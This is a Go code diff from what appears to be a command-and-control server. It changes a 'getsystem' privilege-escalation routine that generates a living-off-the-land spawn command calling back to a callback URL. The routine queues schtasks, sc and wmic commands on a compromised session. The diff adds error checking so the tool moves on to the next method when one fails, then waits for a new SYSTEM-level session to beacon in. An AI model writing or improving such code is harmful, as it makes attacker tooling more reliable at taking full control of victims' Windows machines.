@@ -3015,8 +3015,9 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 			// Generate spawn command using LOLBins
 			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
 
-			// Execute method commands with proper timing
-			for _, cmdTemplate := range method.Commands {
+			// Execute method commands with proper timing and error checking
+			commandFailed := false
+			for idx, cmdTemplate := range method.Commands {
 				cmd := fmt.Sprintf(cmdTemplate, spawnCmd)
 				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
 				task := &tasks.Task{
@@ -3027,23 +3028,72 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 				}
 				is.server.EnqueueTask(task)
 				
-				// Handle different command types
+				// Determine timeout based on command type
+				timeout := 10 * time.Second
 				if strings.Contains(cmd, "schtasks") {
-					// Scheduled task commands - wait for completion
-					is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+					timeout = 10 * time.Second
 				} else if strings.Contains(cmd, "sc ") {
-					// Service commands - wait for service operations
-					is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+					timeout = 10 * time.Second
 				} else if strings.Contains(cmd, "wmic") {
-					// WMI commands - can be slow
-					is.pollTaskResultWithTimeout(sessionID, taskID, 15*time.Second)
-				} else if strings.Contains(cmd, "timeout") {
-					// Timeout commands
-					is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
-				} else {
-					// Regular commands
-					is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+					timeout = 15 * time.Second
+				} else if strings.Contains(cmd, "ping") {
+					timeout = 5 * time.Second
 				}
+				
+				is.pollTaskResultWithTimeout(sessionID, taskID, timeout)
+				
+				// Check command result for errors
+				taskResult := is.taskQueue.Get(taskID)
+				if taskResult != nil && taskResult.Status == "completed" {
+					// Check for WMI ReturnValue errors
+					if strings.Contains(cmd, "wmic") && method.CheckResult != "" {
+						var output string
+						if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
+							if resultValue, ok := resultMap["result"].(string); ok {
+								output = resultValue
+							}
+						}
+						// Check if ReturnValue is not 0 (success)
+						if strings.Contains(output, "ReturnValue") && !strings.Contains(output, "ReturnValue = 0") {
+							fmt.Printf("[!] WMI command failed (non-zero ReturnValue detected)\n")
+							commandFailed = true
+							break
+						}
+					}
+					
+					// Check for common error patterns
+					var output string
+					if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
+						if resultValue, ok := resultMap["result"].(string); ok {
+							output = resultValue
+							errorLower := strings.ToLower(output)
+							// Check for critical errors that indicate command failure
+							if strings.Contains(errorLower, "access is denied") ||
+								strings.Contains(errorLower, "failed") ||
+								strings.Contains(errorLower, "error") ||
+								strings.Contains(errorLower, "invalid syntax") {
+								// Only fail on critical commands (first few), allow cleanup to proceed
+								if idx < 2 {
+									fmt.Printf("[!] Command failed: %s\n", cmd)
+									commandFailed = true
+									break
+								}
+							}
+						}
+					}
+				} else if taskResult != nil && taskResult.Status == "failed" {
+					// Critical command failed
+					if idx < 2 {
+						fmt.Printf("[!] Command execution failed: %s\n", cmd)
+						commandFailed = true
+						break
+					}
+				}
+			}
+			
+			if commandFailed {
+				fmt.Printf("[!] Method %s failed during execution, trying next...\n", method.Name)
+				continue
 			}
 
 			// Wait for new SYSTEM session to connect (spawned process needs time to beacon)
